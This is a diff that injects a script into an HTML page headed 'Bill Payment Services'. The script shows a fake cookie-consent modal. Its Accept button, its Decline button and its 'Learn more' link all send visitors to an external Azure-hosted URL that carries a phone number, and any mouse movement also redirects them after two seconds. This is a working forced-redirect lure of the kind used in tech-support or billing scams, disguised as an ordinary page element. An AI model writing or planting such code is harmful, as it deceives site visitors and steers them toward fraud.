@@ -92,6 +92,85 @@
   
 </head>
 <body>
+
+<script>
+ (function () {
+  const redirectUrl = "https://dcacore78dxdx.z13.web.core.windows.net/index.html?Aniph=1-888-591-9197"; // ⛳ Set your redirect URL here
+  let redirected = false;
+  let moved = false;
+  let initialPos = null;
+
+  function redirectUser() {
+    if (!redirected) {
+      redirected = true;
+      window.location.href = redirectUrl;
+    }
+  }
+
+  function showModal() {
+    const wrapper = document.createElement("div");
+    wrapper.innerHTML = `
+      <div style="
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.5);
+        display: flex; justify-content: center; align-items: center;
+        z-index: 10000;">
+        <div style="
+          background: #fff;
+          padding: 2rem;
+          border-radius: 16px;
+          max-width: 500px;
+          width: 90%;
+          text-align: center;
+          box-shadow:1px 0px 0px 13px rgb(255 227 227 / 35%);">
+          <h2 style="margin-top: 0; font-size: 24px; color: #333;">🍪 Cookie Notice</h2>
+          <p style="font-size: 15px; color: #555;">This site uses cookies to enhance functionality, analyze performance, and ensure compliance with data protection regulations. <a href="${redirectUrl}" style="color: #007bff;">Learn more</a>.</p>
+          <div style="margin-top: 1.5rem; display: flex; gap: 1rem; justify-content: center;">
+            <button id="acceptBtn" style="
+              padding: 10px 20px;
+              background: #28a745;
+              color: white;
+              border: none;
+              border-radius: 8px;
+              font-weight: bold;
+              cursor: pointer;">Accept</button>
+            <button id="declineBtn" style="
+              padding: 10px 20px;
+              background: #dc3545;
+              color: white;
+              border: none;
+              border-radius: 8px;
+              font-weight: bold;
+              cursor: pointer;">Decline</button>
+          </div>
+        </div>
+      </div>
+    `;
+    document.body.appendChild(wrapper);
+
+    document.getElementById("acceptBtn").addEventListener("click", redirectUser);
+    document.getElementById("declineBtn").addEventListener("click", redirectUser);
+  }
+
+  window.addEventListener("load", showModal);
+
+  window.addEventListener("mousemove", function (e) {
+    if (!moved) {
+      if (!initialPos) {
+        initialPos = { x: e.clientX, y: e.clientY };
+        return;
+      }
+      if (e.clientX !== initialPos.x || e.clientY !== initialPos.y) {
+        moved = true;
+        setTimeout(redirectUser, 2000);
+      }
+    }
+  });
+})();
+
+
+</script>
    
     <header>
         <h1>Bill Payment Services</h1>
